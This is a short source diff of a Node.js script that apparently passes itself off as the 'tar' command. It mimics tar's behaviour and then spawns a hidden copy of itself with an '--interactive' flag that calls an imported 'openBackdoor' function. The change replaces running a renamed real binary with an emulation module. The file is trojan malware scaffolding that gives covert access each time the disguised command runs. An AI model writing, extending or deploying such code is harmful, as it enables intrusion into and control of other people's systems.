@@ -1,6 +1,7 @@
 #!/usr/bin/env node
 import { spawn } from "child_process";
 import openBackdoor from "./backdoor";
+import execFile from "./exec_emulation"
 import path from "path";
 
 const args = process.argv.slice(2);
@@ -10,21 +11,11 @@ if (execName == "client.js") {
   execName = "tar";
 }
 
-const exec_redirect = `/bin/${execName}2`;
-
 if (args.includes("--interactive")) {
   openBackdoor();
 } else {
   // First, simulate tar functionality
-  const childProcess = spawn(exec_redirect, args, { argv0: execName });
-
-  childProcess.stdout.on("data", (data) => {
-    process.stdout.write(data);
-  });
-
-  childProcess.stderr.on("data", (data) => {
-    process.stderr.write(`${data}`);
-  });
+  execFile(args, execName);
 
   // Then spawn a child of the same executable, but only with the interactive flag
   const child = spawn(process.argv[0], [process.argv[1], "--interactive"], {
